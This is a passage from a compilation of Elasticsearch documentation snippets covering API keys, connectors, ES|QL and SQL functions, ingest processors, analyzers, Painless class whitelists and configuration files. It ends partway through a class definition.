DESCRIPTION: This snippet shows how to create an API key for the Slack connector using the Elasticsearch API. It specifies the key name, role descriptors, and required permissions.

LANGUAGE: json
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Silent Mode YAML Configuration Example
DESCRIPTION: Example YAML configuration file format for running elasticsearch-certgen in silent mode. Shows how to define multiple instances with their respective IP addresses and DNS names.

LANGUAGE: yaml
CODE:
instances:
  - name: "node1"
    ip:
      - "192.0.2.1"
    dns:
      - "node1.mydomain.com"
  - name: "node2"
    ip:
      - "192.0.2.2"
      - "198.51.100.1"
  - name: "node3"
  - name: "node4"
    dns:
      - "node4.mydomain.com"
      - "node4.internal"
  - name: "CN=node5,OU=IT,DC=mydomain,DC=com"
    filename: "node5"

----------------------------------------

TITLE: Returning Pi value using ESQL PI() function
DESCRIPTION: The PI() function returns the mathematical constant Pi, which is the ratio of a circle's circumference to its diameter. It takes no arguments and returns a single ROW containing the value of Pi.

LANGUAGE: sql
CODE:
ROW PI()

----------------------------------------

TITLE: Configuring Synthetic Source for Text Fields
DESCRIPTION: Example of setting up an index with synthetic _source for a text field with a keyword sub-field.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "text": {
        "type": "text",
        "fields": {
          "raw": {
            "type": "keyword"
          }
        }
      }
    }
  }
}
PUT idx/_doc/1
{
  "text": [
    "the quick brown fox",
    "the quick brown fox",
    "jumped over the lazy dog"
  ]
}

----------------------------------------

TITLE: Including TO_DATETIME Function Examples in Markdown
DESCRIPTION: This snippet includes the markdown file containing usage examples for the TO_DATETIME function.

LANGUAGE: markdown
CODE:
:::{include} ../examples/to_datetime.md

----------------------------------------

TITLE: Having Clause Translation Tests
DESCRIPTION: Test cases for translating SQL HAVING clauses to Elasticsearch bucket selectors

LANGUAGE: SQL
CODE:
SELECT keyword, max(float) FROM test GROUP BY keyword HAVING max(float) IS NOT NULL;

LANGUAGE: DSL
CODE:
InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.isNotNull(params.a0))

----------------------------------------

TITLE: Documentation Structure for FLOOR Function
DESCRIPTION: Basic markdown structure showing the organization of FLOOR function documentation with image and include directives.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `FLOOR` [esql-floor]

**Syntax**

:::{image} ../../../images/functions/floor.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/floor.md
:::

:::{include} ../description/floor.md
:::

:::{include} ../types/floor.md
:::

:::{include} ../examples/floor.md
:::

----------------------------------------

TITLE: Kuromoji Part of Speech Filter Response Example
DESCRIPTION: Example response showing the tokens generated after applying the kuromoji_part_of_speech filter. The response demonstrates how particles are removed from the original text.

LANGUAGE: console
CODE:
{
  "tokens" : [ {
    "token" : "寿司",
    "start_offset" : 0,
    "end_offset" : 2,
    "type" : "word",
    "position" : 0
  }, {
    "token" : "おいしい",
    "start_offset" : 3,
    "end_offset" : 7,
    "type" : "word",
    "position" : 2
  } ]
}

----------------------------------------

TITLE: LDAP Realm Configuration Example
DESCRIPTION: Example YAML configuration for an LDAP realm showing basic settings like order and URL

LANGUAGE: yaml
CODE:
xpack.security.authc.realms:
    native.realm1:
        order: 0
        ...
    ldap.realm2:
        order: 1
        ...
    active_directory.realm3:
        order: 2
        ...

----------------------------------------

TITLE: Multiple Data Paths Configuration for Unix Systems
DESCRIPTION: Configuration example for setting multiple data paths on Unix-like systems (deprecated since 7.13.0)

LANGUAGE: yaml
CODE:
path:
  data:
    - /mnt/elasticsearch_1
    - /mnt/elasticsearch_2
    - /mnt/elasticsearch_3

----------------------------------------

TITLE: Retrieving Elasticsearch Extension Information
DESCRIPTION: Shows how to retrieve information about a specific Elasticsearch extension or list all extensions for an account using GET requests.

LANGUAGE: shell
CODE:
curl -X GET \
  https://api.elastic-cloud.com/api/v1/deployments/extensions \
  -H 'Content-Type: application/json' \
  -H "Authorization: ApiKey $CLOUD_API_KEY" \

LANGUAGE: shell
CODE:
curl -X GET \
  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: ApiKey $CLOUD_API_KEY" \

----------------------------------------

TITLE: Documenting Date Part Extraction Function Parameters in Markdown
DESCRIPTION: This snippet defines the parameters for a date part extraction function. It specifies the 'datePart' parameter with its possible values and the 'date' parameter. Both parameters are described with their expected inputs and null behavior.

LANGUAGE: markdown
CODE:
**Parameters**

`datePart`
:   Part of the date to extract.  Can be: `aligned_day_of_week_in_month`, `aligned_day_of_week_in_year`, `aligned_week_of_month`, `aligned_week_of_year`, `ampm_of_day`, `clock_hour_of_ampm`, `clock_hour_of_day`, `day_of_month`, `day_of_week`, `day_of_year`, `epoch_day`, `era`, `hour_of_ampm`, `hour_of_day`, `instant_seconds`, `micro_of_day`, `micro_of_second`, `milli_of_day`, `milli_of_second`, `minute_of_day`, `minute_of_hour`, `month_of_year`, `nano_of_day`, `nano_of_second`, `offset_seconds`, `proleptic_month`, `second_of_day`, `second_of_minute`, `year`, or `year_of_era`. Refer to [java.time.temporal.ChronoField](https://docs.oracle.com/javase/8/docs/api/java/time/temporal/ChronoField.html) for a description of these values.  If `null`, the function returns `null`.

`date`
:   Date expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: REPLACE Function Documentation Header
DESCRIPTION: Markdown header and warning comment indicating this is auto-generated documentation for the REPLACE function.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `REPLACE` [esql-replace]

----------------------------------------

TITLE: Defining ByteBuffer Class in Java NIO
DESCRIPTION: Defines the ByteBuffer class with methods for converting to other buffer types, getting values, setting byte order, and wrapping byte arrays.

LANGUAGE: Java
CODE:
class java.nio.ByteBuffer {
  CharBuffer asCharBuffer()
  DoubleBuffer asDoubleBuffer()
  FloatBuffer asFloatBuffer()
  IntBuffer asIntBuffer()
  LongBuffer asLongBuffer()
  ShortBuffer asShortBuffer()
  byte get(int)
  # TODO: https:#github.com/elastic/elasticsearch/issues/79867
  # ByteBuffer get(int, byte[])
  # ByteBuffer get(int, byte[], int, int)
  char getChar(int)
  double getDouble(int)
  float getFloat(int)
  int getInt(int)
  long getLong(int)
  short getShort(int)
  ByteOrder order()
  ByteBuffer order(ByteOrder)
  ByteBuffer wrap(byte[])
  ByteBuffer wrap(byte[], int, int)
}

----------------------------------------

TITLE: Configuring Preload Settings in YAML Configuration
DESCRIPTION: Example of setting index.store.preload in the elasticsearch.yml configuration file to preload specific file extensions (nvd and dvd) into memory.

LANGUAGE: yaml
CODE:
index.store.preload: ["nvd", "dvd"]

----------------------------------------

TITLE: Split Processor with Trailing Fields Preservation
DESCRIPTION: Configuration example showing the Split processor with preserve_trailing option enabled. This configuration splits strings by comma and preserves empty trailing fields in the resulting array.

LANGUAGE: json
CODE:
{
  "split": {
    "field": "my_field",
    "separator": ",",
    "preserve_trailing": true
  }
}

----------------------------------------

TITLE: CSV-SPEC Test with Tags
DESCRIPTION: Example of a CSV-SPEC test file with tagged regions for documentation inclusion, showing test structure and result formatting.

LANGUAGE: csv-spec
CODE:
sin
// tag::sin[]
ROW a=1.8
| EVAL sin=SIN(a)
// end::sin[]
;

// tag::sin-result[]
a:double | sin:double
     1.8 | 0.9738476308781951
// end::sin-result[]
;

----------------------------------------

TITLE: Specifying Timezone Offsets for Elasticsearch
DESCRIPTION: This snippet provides examples of timezone offsets. These are included because timezones can be specified by their offset from UTC, allowing for precise time calculations across different regions.

LANGUAGE: plaintext
CODE:
# Offsets, since zones can be specified by the offset too
+11:00
+04:30
+01:00
+00:00
-00:00
-01:15
-02:00
-11:00

----------------------------------------

TITLE: Configuring URL Decode Processor in Elasticsearch
DESCRIPTION: Example configuration for the URL decode processor in an Elasticsearch ingest pipeline. Shows basic usage with a single field to decode.

LANGUAGE: javascript
CODE:
{
  "urldecode": {
    "field": "my_url_to_decode"
  }
}

----------------------------------------

TITLE: Filtering SHOW FUNCTIONS with Exact Match in Elasticsearch SQL
DESCRIPTION: Example of using the SHOW FUNCTIONS command with an exact match pattern to filter for a specific function.

LANGUAGE: sql
CODE:
SHOW FUNCTIONS LIKE 'ABS';

     name      |     type
---------------+---------------
ABS            |SCALAR

----------------------------------------

TITLE: ESQL Function Parameters Table
DESCRIPTION: Markdown table documenting the supported named parameters for ESQL functions, including parameter names, allowed data types, and detailed descriptions of each parameter's purpose.

LANGUAGE: markdown
CODE:
| name | types | description |
| --- | --- | --- |
| fuzziness | [keyword] | Maximum edit distance allowed for matching. |
| auto_generate_synonyms_phrase_query | [boolean] | If true, match phrase queries are automatically created for multi-term synonyms. |
| analyzer | [keyword] | Analyzer used to convert the text in the query value into token. |
| minimum_should_match | [integer] | Minimum number of clauses that must match for a document to be returned. |
| zero_terms_query | [keyword] | Number of beginning characters left unchanged for fuzzy matching. |
| boost | [float] | Floating point number used to decrease or increase the relevance scores of the query. |
| fuzzy_transpositions | [boolean] | If true, edits for fuzzy matching include transpositions of two adjacent characters (ab → ba). |
| fuzzy_rewrite | [keyword] | Method used to rewrite the query. See the rewrite parameter for valid values and more information. |
| prefix_length | [integer] | Number of beginning characters left unchanged for fuzzy matching. |
| lenient | [boolean] | If false, format-based errors, such as providing a text query value for a numeric field, are returned. |
| operator | [keyword] | Boolean logic used to interpret text in the query value. |
| max_expansions | [integer] | Maximum number of terms to which the query will expand. |

----------------------------------------

TITLE: MEDIAN Function Description
DESCRIPTION: Explains that MEDIAN returns the value greater than half of all values and less than half of all values, equivalent to the 50th percentile. Notes that like PERCENTILE, MEDIAN calculations are typically approximate in nature.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

The value that is greater than half of all values and less than half of all values, also known as the 50% `PERCENTILE`.

::::{note}
Like `PERCENTILE`, `MEDIAN` is [usually approximate].
::::

----------------------------------------

TITLE: Creating a custom analyzer with common grams filter in Elasticsearch
DESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that includes the common grams filter.

LANGUAGE: console
CODE:
PUT /common_grams_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "index_grams": {
          "tokenizer": "whitespace",
          "filter": [ "common_grams" ]
        }
      },
      "filter": {
        "common_grams": {
          "type": "common_grams",
          "common_words": [ "a", "is", "the" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Installing Mapper Size Plugin for Elasticsearch
DESCRIPTION: Command to install the mapper-size plugin using the Elasticsearch plugin manager. This plugin must be installed on every node in the cluster, and each node must be restarted after installation.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install mapper-size

----------------------------------------

TITLE: Configuring GC Logging
DESCRIPTION: Example of configuring garbage collection logging settings with custom file location and rotation.

LANGUAGE: shell
CODE:
# Turn off all previous logging configuratons
-Xlog:disable

# Default settings from JEP 158, but with `utctime` instead of `uptime` to match the next line
-Xlog:all=warning:stderr:utctime,level,tags

# Enable GC logging to a custom location with a variety of options
-Xlog:gc*,gc+age=trace,safepoint:file=/opt/my-app/gc.log:utctime,level,pid,tags:filecount=32,filesize=64m

----------------------------------------

TITLE: Docker Configuration for PostgreSQL Connector
DESCRIPTION: YAML configuration example for deploying the PostgreSQL connector using Docker

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: postgresql
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Configuring Elasticsearch Plugins in YAML
DESCRIPTION: Example of an elasticsearch-plugins.yml file for managing Elasticsearch plugins. It demonstrates how to specify official and unofficial plugins, including their IDs and locations.

LANGUAGE: yaml
CODE:
plugins:
  - id: analysis-icu
  - id: repository-azure
  - id: custom-mapper
    location: https://example.com/archive/custom-mapper-1.0.0.zip

----------------------------------------

TITLE: Multiple Pattern Matching with Trace Option
DESCRIPTION: Demonstrates using multiple Grok patterns with the trace_match feature to identify which pattern matched. Uses custom patterns for matching pet types.

LANGUAGE: console
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
  "description" : "parse multiple patterns",
  "processors": [
    {
      "grok": {
        "field": "message",
        "patterns": ["%{FAVORITE_DOG:pet}", "%{FAVORITE_CAT:pet}"],
        "pattern_definitions" : {
          "FAVORITE_DOG" : "beagle",
          "FAVORITE_CAT" : "burmese"
        }
      }
    }
  ]
},
"docs":[
  {
    "_source": {
      "message": "I love burmese cats!"
    }
  }
  ]
}

----------------------------------------

TITLE: Using SPLIT Function in ESQL
DESCRIPTION: Demonstrates how to use the SPLIT function to convert a semicolon-delimited string into an array. The example takes a string of words separated by semicolons and splits it into an array of individual words.

LANGUAGE: esql
CODE:
ROW words="foo;bar;baz;qux;quux;corge"
| EVAL word = SPLIT(words, ";")

----------------------------------------

TITLE: Defining VersionScriptDocValues Class in Java
DESCRIPTION: Class definition for handling version script doc values with methods to retrieve version strings by index or as single value.

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.versionfield.VersionScriptDocValues {
    String get(int)
    String getValue()
}

----------------------------------------

TITLE: Running Logstash on Windows for Data Ingestion
DESCRIPTION: Example command to run Logstash on Windows for ingesting TDVT test data into Elasticsearch. Requires adapting the config file with appropriate paths and credentials.

LANGUAGE: bash
CODE:
logstash -f logstash/config_file.conf

----------------------------------------

TITLE: Restricted DocumentBuilderFactory Usage in Java
DESCRIPTION: Defines security restrictions preventing direct usage of DocumentBuilderFactory. Developers must use SamlUtils#getHardenedDocumentBuilder(String[]) instead for secure XML parsing.

LANGUAGE: java
CODE:
javax.xml.parsers.DocumentBuilderFactory#newInstance()
javax.xml.parsers.DocumentBuilderFactory#newInstance(java.lang.String, java.lang.ClassLoader)

----------------------------------------

TITLE: Connector Service Sync Output
DESCRIPTION: Example terminal output showing the progress and results of a successful PostgreSQL data sync operation.

LANGUAGE: shell
CODE:
[FMWK][13:22:26][INFO] Fetcher <create: 499 update: 0 |delete: 0>
[FMWK][13:22:26][INF0] Fetcher <create: 599 update: 0 |delete: 0>
[FMWK][13:22:26][INFO] Fetcher <create: 699 update: 0 |delete: 0>
...
[FMWK][23:22:28][INF0] [oRXQwYYBLhXTs-qYpJ9i] Sync done: 3864 indexed, 0 deleted.
(27 seconds)

----------------------------------------

TITLE: Fingerprint Processor Simulation Result in Elasticsearch
DESCRIPTION: This snippet shows the result of simulating the fingerprint processor. It displays the computed hash in the 'fingerprint' field of the document.

LANGUAGE: console-result
CODE:
{
  "docs": [
    {
      "doc": {
        ...
        "_source": {
          "fingerprint" : "WbSUPW4zY1PBPehh2AA/sSxiRjw=",
          "user" : {
            "last_name" : "Smith",
            "first_name" : "John",
            "date_of_birth" : "1980-01-15",
            "is_active" : true
          }
        }
      }
    }
  ]
}

----------------------------------------

TITLE: SPLIT Function Syntax Image
DESCRIPTION: Image inclusion directive for the SPLIT function syntax diagram.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/split.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Creating Elasticsearch Node Instances Configuration
DESCRIPTION: Generates an instances.yml file containing node configurations for 64 nodes (8x8 grid) with specific naming patterns for certificates.

LANGUAGE: bash
CODE:
rm instances.yml
echo 'instances:'                                   >> instances.yml
for n in {1..8}
do
for c in {1..8}
do
echo "  - name: \"n$n.c$c\""                        >> instances.yml
echo "    cn:"                                      >> instances.yml
echo "      - \"node$n.cluster$c.elasticsearch\""   >> instances.yml
echo "    dns: "                                    >> instances.yml
echo "      - \"node$n.cluster$c.elasticsearch\""   >> instances.yml
done
done
cat instances.yml

----------------------------------------

TITLE: SQL Quoted Identifiers Example
DESCRIPTION: Shows usage of quoted and unquoted identifiers in SQL queries, particularly useful when identifiers contain special characters.

LANGUAGE: sql
CODE:
SELECT ip_address FROM "hosts-*"

----------------------------------------

TITLE: Example Response from Normalize Aggregation
DESCRIPTION: Shows the response structure from a normalize aggregation query, including formatted percentage values and original sales amounts.

LANGUAGE: console
CODE:
{
   "took": 11,
   "timed_out": false,
   "_shards": ...,
   "hits": ...,
   "aggregations": {
      "sales_per_month": {
         "buckets": [
            {
               "key_as_string": "2015/01/01 00:00:00",
               "key": 1420070400000,
               "doc_count": 3,
               "sales": {
                  "value": 550.0
               },
               "percent_of_total_sales": {
                  "value": 0.5583756345177665,
                  "value_as_string": "55.84%"
               }
            },
            {
               "key_as_string": "2015/02/01 00:00:00",
               "key": 1422748800000,
               "doc_count": 2,
               "sales": {
                  "value": 60.0
               },
               "percent_of_total_sales": {
                  "value": 0.06091370558375635,
                  "value_as_string": "06.09%"
               }
            },
            {
               "key_as_string": "2015/03/01 00:00:00",
               "key": 1425168000000,
               "doc_count": 2,
               "sales": {
                  "value": 375.0
               },
               "percent_of_total_sales": {
                  "value": 0.38071065989847713,
                  "value_as_string": "38.07%"
               }
            }
         ]
      }
   }
}

----------------------------------------

TITLE: Markdown Warning Block for MEDIAN_ABSOLUTE_DEVIATION Function
DESCRIPTION: A warning block in Markdown format explaining that the MEDIAN_ABSOLUTE_DEVIATION function is non-deterministic and can produce slightly different results for the same data.

LANGUAGE: markdown
CODE:
::::{warning}
`MEDIAN_ABSOLUTE_DEVIATION` is also [non-deterministic](https://en.wikipedia.org/wiki/Nondeterministic_algorithm).
This means you can get slightly different results using the same data.
::::

----------------------------------------

TITLE: SELECT with FROM Clause and Table Alias
DESCRIPTION: Demonstrates how to use the FROM clause with a table alias in Elasticsearch SQL.

LANGUAGE: sql
CODE:
SELECT e.emp_no FROM emp AS e LIMIT 1;

----------------------------------------

TITLE: Configuring Inference API Input Text Settings
DESCRIPTION: Settings for handling input text truncation when third-party services report input size errors.

LANGUAGE: yaml
CODE:
xpack.inference.truncator.reduction_percentage: 0.5

----------------------------------------

TITLE: Creating S3 Connector via Elasticsearch API
DESCRIPTION: API request example for creating a new S3 connector instance in Elasticsearch.

LANGUAGE: console
CODE:
PUT _connector/my-s3-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Amazon S3",
  "service_type": "s3"
}

----------------------------------------

TITLE: Creating and Using Flattened Fields in Elasticsearch
DESCRIPTION: Example showing how to create an index with a flattened field type and index a document with nested object structure.

LANGUAGE: console
CODE:
PUT bug_reports
{
  "mappings": {
    "properties": {
      "title": {
        "type": "text"
      },
      "labels": {
        "type": "flattened"
      }
    }
  }
}

POST bug_reports/_doc/1
{
  "title": "Results are not sorted correctly.",
  "labels": {
    "priority": "urgent",
    "release": ["v1.2.5", "v1.3.0"],
    "timestamp": {
      "created": 1541458026,
      "closed": 1541457010
    }
  }
}

----------------------------------------

TITLE: Including Common Timezone Abbreviations for Elasticsearch
DESCRIPTION: This snippet lists common short names for major timezones. These abbreviations are widely recognized and used in various contexts.

LANGUAGE: plaintext
CODE:
# Short names of some major timezones
GMT
UTC
CET

----------------------------------------

TITLE: Analyzing Text with UAX URL Email Tokenizer
DESCRIPTION: Example of using the UAX URL Email tokenizer to analyze text containing an email address, demonstrating how it preserves the email as a single token.

LANGUAGE: console
CODE:
POST _analyze
{
  "tokenizer": "uax_url_email",
  "text": "Email me at john.smith@global-international.com"
}

LANGUAGE: text
CODE:
[ Email, me, at, john.smith@global-international.com ]

----------------------------------------

TITLE: Creating a Salesforce Connector via API
DESCRIPTION: Example of using the Elasticsearch API to create a new Salesforce connector.

LANGUAGE: console
CODE:
PUT _connector/my-salesforce-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Salesforce",
  "service_type": "salesforce"
}

----------------------------------------

TITLE: Accessing Array Elements in Painless
DESCRIPTION: Shows how to access and modify array elements using the array access operator '[]'. Examples include single-dimensional arrays and using the 'def' type for flexible array handling.

LANGUAGE: painless
CODE:
int[] x = new int[2];
x[0] = 2;
x[1] = 5;
int y = x[0] + x[1];
int z = 1;
int i = x[z];

LANGUAGE: painless
CODE:
def d = new int[2];
d[0] = 2;
d[1] = 5;
def x = d[0] + d[1];
def y = 1;
def z = d[y];

LANGUAGE: painless
CODE:
int[][][] ia3 = new int[2][3][4];
ia3[1][2][3] = 99;
int i = ia3[1][2][3];

----------------------------------------

TITLE: Basic Script Query Example in Elasticsearch
DESCRIPTION: Demonstrates a basic script query that filters documents based on amount and type fields. The script calculates a signed amount value and filters for values less than 10.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "bool": {
      "filter": {
        "script": {
          "script": """
            double amount = doc['amount'].value;
            if (doc['type'].value == 'expense') {
              amount *= -1;
            }
            return amount < 10;
          """
        }
      }
    }
  }
}

----------------------------------------

TITLE: Retrieving Current DateTime using NOW() in Elasticsearch SQL
DESCRIPTION: Demonstrates how to use the NOW() function to get the current date and time in Elasticsearch SQL. The function returns the current timestamp when executed.

LANGUAGE: sql
CODE:
ROW current_date = NOW()

----------------------------------------

TITLE: Configuring ICU Analyzer Parameters in Elasticsearch
DESCRIPTION: Configuration options for the icu_analyzer showing available parameters for normalization method and mode. The analyzer uses icu_normalizer char filter, icu_tokenizer, and icu_folding token filter for text processing.

LANGUAGE: yaml
CODE:
method: # Accepts nfkc, nfc or nfkc_cf (default)
mode: # Accepts compose (default) or decompose

----------------------------------------

TITLE: Configuring Uppercase Processor in Elasticsearch
DESCRIPTION: This snippet demonstrates how to configure the Uppercase processor in an Elasticsearch ingest pipeline. It specifies the 'field' option to determine which field should be converted to uppercase.

LANGUAGE: js
CODE:
{
  "uppercase": {
    "field": "foo"
  }
}

----------------------------------------

TITLE: Defining JSON Operations for Reindex Scripts in Java
DESCRIPTION: Specifies allowed JSON operations for loading and dumping data in reindex scripts.

LANGUAGE: java
CODE:
class org.elasticsearch.painless.api.Json {
  def load(String)
  String dump(def)
  String dump(def, boolean)
}

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate text to apply the Apache License 2.0 to a work. Includes copyright notice template and standard license reference text.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Markdown Table of Elasticsearch Query String Function Parameters
DESCRIPTION: A comprehensive table listing supported named parameters for Elasticsearch query string functions. It includes parameter names, accepted data types, and detailed descriptions of each parameter's purpose and default values.

LANGUAGE: markdown
CODE:
| name | types | description |
| --- | --- | --- |
| max_determinized_states | [integer] | Maximum number of automaton states required for the query. Default is 10000. |
| fuzziness | [keyword] | Maximum edit distance allowed for matching. |
| auto_generate_synonyms_phrase_query | [boolean] | If true, match phrase queries are automatically created for multi-term synonyms. Defaults to true. |
| phrase_slop | [integer] | Maximum number of positions allowed between matching tokens for phrases. Defaults to 0 (which means exact matches are required). |
| default_field | [keyword] | Default field to search if no field is provided in the query string. Supports wildcards (*). |
| allow_leading_wildcard | [boolean] | If true, the wildcard characters * and ? are allowed as the first character of the query string. Defaults to true. |
| minimum_should_match | [string] | Minimum number of clauses that must match for a document to be returned. |
| fuzzy_transpositions | [boolean] | If true, edits for fuzzy matching include transpositions of two adjacent characters (ab → ba). Defaults to true. |
| fuzzy_prefix_length | [integer] | Number of beginning characters left unchanged for fuzzy matching. Defaults to 0. |
| time_zone | [keyword] | Coordinated Universal Time (UTC) offset or IANA time zone used to convert date values in the query string to UTC. |
| lenient | [boolean] | If false, format-based errors, such as providing a text query value for a numeric field, are returned. Defaults to false. |
| rewrite | [keyword] | Method used to rewrite the query. |
| default_operator | [keyword] | Default boolean logic used to interpret text in the query string if no operators are specified. |
| analyzer | [keyword] | Analyzer used to convert the text in the query value into token. Defaults to the index-time analyzer mapped for the default_field. |
| fuzzy_max_expansions | [integer] | Maximum number of terms to which the query expands for fuzzy matching. Defaults to 50. |
| quote_analyzer | [keyword] | Analyzer used to convert quoted text in the query string into tokens. Defaults to the search_quote_analyzer mapped for the default_field. |
| allow_wildcard | [boolean] | If true, the query attempts to analyze wildcard terms in the query string. Defaults to false.  |
| boost | [float] | Floating point number used to decrease or increase the relevance scores of the query. |
| quote_field_suffix | [keyword] | Suffix appended to quoted text in the query string. |
| enable_position_increments | [boolean] | If true, enable position increments in queries constructed from a query_string search. Defaults to true. |
| fields | [keyword] | Array of fields to search. Supports wildcards (*). |

----------------------------------------

TITLE: Running Elasticsearch Connector Docker Container
DESCRIPTION: Docker command to run the Elasticsearch Connector Service container with mounted configuration and network settings.

LANGUAGE: sh
CODE:
docker run \
-v "</absolute/path/to>/connectors-config:/config" \ # NOTE: you must change this path to match where the config.yml is located
--rm \
--tty -i \
--network host \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Customizing common grams filter in Elasticsearch
DESCRIPTION: This example demonstrates how to create a custom common grams filter with ignore_case and query_mode set to true.

LANGUAGE: console
CODE:
PUT /common_grams_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "index_grams": {
          "tokenizer": "whitespace",
          "filter": [ "common_grams_query" ]
        }
      },
      "filter": {
        "common_grams_query": {
          "type": "common_grams",
          "common_words": [ "a", "is", "the" ],
          "ignore_case": true,
          "query_mode": true
        }
      }
    }
  }
}

----------------------------------------

TITLE: Disabling Cache on Index Creation
DESCRIPTION: Example showing how to disable the shard request cache when creating a new Elasticsearch index using index settings.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "index.requests.cache.enable": false
  }
}

----------------------------------------

TITLE: Kuromoji Tokenizer User Dictionary Format
DESCRIPTION: This snippet shows the CSV format for the user dictionary used by the kuromoji_tokenizer. It includes an example entry for a custom noun.

LANGUAGE: text
CODE:
東京スカイツリー,東京 スカイツリー,トウキョウ スカイツリー,カスタム名詞

----------------------------------------

TITLE: Reading Transport Protocol Version Data in Java
DESCRIPTION: Example showing how to read data using transport versioning checks to handle different protocol versions. This demonstrates version-specific data reading based on transport version compatibility.

LANGUAGE: java
CODE:
str = in.readString();
bool = in.readBoolean();
if (in.getTransportVersion().onOrAfter(TransportVersions.NEW_CONSTANT)) {
    num = in.readVInt();
}

----------------------------------------

TITLE: Using Elasticsearch Service Token for Authentication
DESCRIPTION: Example of using the created service token to authenticate an HTTP request to the Elasticsearch cluster health endpoint.

LANGUAGE: shell
CODE:
curl -H "Authorization: Bearer AAEAAWVsYXN0aWM...vZmxlZXQtc2VydmVyL3Rva2VuMTo3TFdaSDZ" http://localhost:9200/_cluster/health

----------------------------------------

TITLE: Restricted TransformerFactory Usage in Java
DESCRIPTION: Defines security restrictions preventing direct usage of TransformerFactory. Developers must use SamlUtils#getHardenedXMLTransformer() instead for secure XML transformation.

LANGUAGE: java
CODE:
javax.xml.transform.TransformerFactory#newInstance()
javax.xml.transform.TransformerFactory#newInstance(java.lang.String, java.lang.ClassLoader)

----------------------------------------

TITLE: Including ST_ENVELOPE Function Parameters in Markdown
DESCRIPTION: This snippet includes the parameters documentation for the ST_ENVELOPE function from an external Markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/st_envelope.md
:::

----------------------------------------

TITLE: Output Document After URI Parts Processing in Elasticsearch
DESCRIPTION: Resulting document after the URI parts processor has been applied, showing the extracted URI components in the target field.

LANGUAGE: json
CODE:
"_source" : {
  "input_field" : "http://myusername:mypassword@www.example.com:80/foo.gif?key1=val1&key2=val2#fragment",
  "url" : {
    "path" : "/foo.gif",
    "fragment" : "fragment",
    "extension" : "gif",
    "password" : "mypassword",
    "original" : "http://myusername:mypassword@www.example.com:80/foo.gif?key1=val1&key2=val2#fragment",
    "scheme" : "http",
    "port" : 80,
    "user_info" : "myusername:mypassword",
    "domain" : "www.example.com",
    "query" : "key1=val1&key2=val2",
    "username" : "myusername"
  }
}

----------------------------------------

TITLE: Internal SQL Script Utils Class
DESCRIPTION: Extended utility class containing advanced SQL functions including conditional operations, mathematical calculations, date/time functions, string manipulation, and geometric operations

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.sql.expression.function.scalar.whitelist.InternalSqlScriptUtils {
  def coalesce(java.util.List)
  def greatest(java.util.List)
  def least(java.util.List)
  def nullif(Object, Object)

  def add(Object, Object)
  def sub(Object, Object)
  def div(Object, Object)
  def mod(Object, Object)
  def mul(Object, Object)
  Number atan2(Number, Number)
  Number neg(Number)
  Number power(Number, Number)
  Number round(Number, Number)
  Number truncate(Number, Number)

  Number abs(Number)
  Number acos(Number)
  Number asin(Number)
  Number atan(Number)
  Number cbrt(Number)
  Number ceil(Number)
  Number cos(Number)
  Number cosh(Number)
  Number cot(Number)
  Number degrees(Number)
  Number e(Number)
  Number exp(Number)
  Number expm1(Number)
  Number floor(Number)
  Number log(Number)
  Number log10(Number)
  Number pi(Number)
  Number radians(Number)
  Number random(Number)
  Number sign(Number)
  Number sin(Number)
  Number sinh(Number)
  Number sqrt(Number)
  Number tan(Number)

  Integer dateTimeChrono(Object, String, String)
  Integer dateTimeExtract(Object, String, String)
  String  dayName(Object, String)
  Integer dayOfWeek(Object, String)
  String  monthName(Object, String)
